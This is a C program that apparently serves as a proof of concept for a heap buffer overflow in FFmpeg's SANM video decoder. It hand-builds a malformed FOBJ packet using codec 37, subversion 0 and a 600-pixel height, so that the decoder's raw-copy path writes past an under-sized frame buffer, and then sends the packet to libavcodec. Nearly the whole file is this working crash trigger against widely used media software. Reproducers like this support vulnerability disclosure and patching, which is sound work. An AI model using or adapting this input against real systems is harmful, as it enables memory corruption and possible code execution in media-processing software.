#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <libavcodec/avcodec.h>
#include <libavutil/mem.h>
#include <libavutil/log.h>

static void put_le16(uint8_t *p, uint16_t v) { p[0]=v&0xff; p[1]=(v>>8)&0xff; }
static void put_le32(uint8_t *p, uint32_t v) { p[0]=v&0xff;p[1]=(v>>8)&0xff;p[2]=(v>>16)&0xff;p[3]=(v>>24)&0xff; }
static void put_be32(uint8_t *p, uint32_t v) { p[0]=(v>>24)&0xff;p[1]=(v>>16)&0xff;p[2]=(v>>8)&0xff;p[3]=v&0xff; }

/* Build a minimal "FOBJ" chunk based ANIMv0/1-style packet that exercises
 * libavcodec/sanm.c process_frame_obj() with subversion < 2 (Rebel Assault 1
 * 384x242 fixed internal size assumption). The FOBJ w/h fields describe a
 * frame taller than the fixed 384x242 buffer, and codec 37's raw-copy path
 * (compr == 0) walks past the end of the under-sized frm1 buffer. */
int main(void)
{
    av_log_set_level(AV_LOG_DEBUG);

    const int codec = 37;
    const int left = 0, top = 0;
    const int w = 8;      /* small per-row copy size */
    const int h = 600;    /* max allowed by the generic w/h sanity check */

    int pixel_len = w * h;
    int payload_len = 2+2+2+2+2 + 4 /*reserved*/ + 1+1+2+4+4+1+3 /*codec37 hdr*/ + pixel_len;
    int fobj_len = 8 + payload_len;

    uint8_t *pkt = av_mallocz(fobj_len + AV_INPUT_BUFFER_PADDING_SIZE);
    uint8_t *p = pkt;
    memcpy(p, "FOBJ", 4); p += 4;
    put_be32(p, payload_len); p += 4;
    put_le16(p, codec); p += 2;
    put_le16(p, left); p += 2;
    put_le16(p, top); p += 2;
    put_le16(p, w); p += 2;
    put_le16(p, h); p += 2;
    memset(p, 0, 4); p += 4; /* reserved, skipped in process_frame_obj */
    *p++ = 0; /* compr */
    *p++ = 0; /* mvoff */
    put_le16(p, 0); p += 2; /* seq */
    put_le32(p, 0); p += 4; /* decoded_size */
    memset(p, 0, 4); p += 4; /* skip4 */
    *p++ = 0; /* flags */
    memset(p, 0, 3); p += 3; /* skip3 */
    memset(p, 0x41, pixel_len); p += pixel_len;

    fprintf(stderr, "packet len=%d (p-pkt=%ld)\n", fobj_len, (long)(p - pkt));

    int extradata_len = 2 + 256*4;
    uint8_t *extradata = av_mallocz(extradata_len + AV_INPUT_BUFFER_PADDING_SIZE);
    put_le16(extradata, 0); /* subversion = 0 */

    const AVCodec *codec_ptr = avcodec_find_decoder(AV_CODEC_ID_SANM);
    if (!codec_ptr) { fprintf(stderr, "no sanm decoder\n"); return 1; }

    AVCodecContext *ctx = avcodec_alloc_context3(codec_ptr);
    ctx->extradata = extradata;
    ctx->extradata_size = extradata_len;
    ctx->width = 0;
    ctx->height = 0;

    if (avcodec_open2(ctx, codec_ptr, NULL) < 0) {
        fprintf(stderr, "open failed\n");
        return 1;
    }

    AVPacket *avpkt = av_packet_alloc();
    avpkt->data = pkt;
    avpkt->size = fobj_len;

    AVFrame *frame = av_frame_alloc();
    int ret = avcodec_send_packet(ctx, avpkt);
    fprintf(stderr, "send_packet ret=%d\n", ret);
    ret = avcodec_receive_frame(ctx, frame);
    fprintf(stderr, "receive_frame ret=%d\n", ret);

    av_frame_free(&frame);
    av_packet_free(&avpkt);
    avcodec_free_context(&ctx);
    av_free(pkt);

    fprintf(stderr, "done without crash\n");
    return 0;
}
